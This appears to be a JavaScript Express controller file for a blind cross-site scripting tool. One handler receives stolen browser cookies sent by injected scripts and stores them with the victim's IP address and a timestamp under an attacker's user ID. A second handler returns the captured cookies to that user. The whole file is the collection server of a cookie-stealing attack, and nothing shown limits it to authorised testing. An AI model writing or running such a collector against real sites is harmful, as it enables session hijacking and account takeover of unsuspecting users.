import CapturedCookie from '../models/capturedCookieModel.js';

export const bxssListener = async (req, res) => {
  try {
    const { cookie, userId } = req.query;

    if (!cookie || !userId) {
      return res.status(400).json({ message: 'Missing cookie or userId' });
    }

    const logEntry = {
      userId,
      cookie,
      ip: req.ip,
      timestamp: new Date().toISOString(),
    };

    console.log('Captured Cookie:', logEntry);

    const newCapturedCookie = await CapturedCookie.create(logEntry);

    res.status(200).json({
      status: 'success',
      data: newCapturedCookie,
    });
  } catch (error) {
    console.error('Error saving captured cookie:', error);
    res.status(500).json({ message: 'Server error', error });
  }
};

export const getXssResults = async (req, res) => {
  try {
    const { userId } = req.query;

    if (!userId) {
      return res.status(400).json({ message: 'Missing userId' });
    }

    const results = await CapturedCookie.find({ userId });
    res.status(200).json(results);
  } catch (error) {
    console.error('Error fetching XSS results:', error);
    res.status(500).json({ message: 'Server error', error });
  }
};
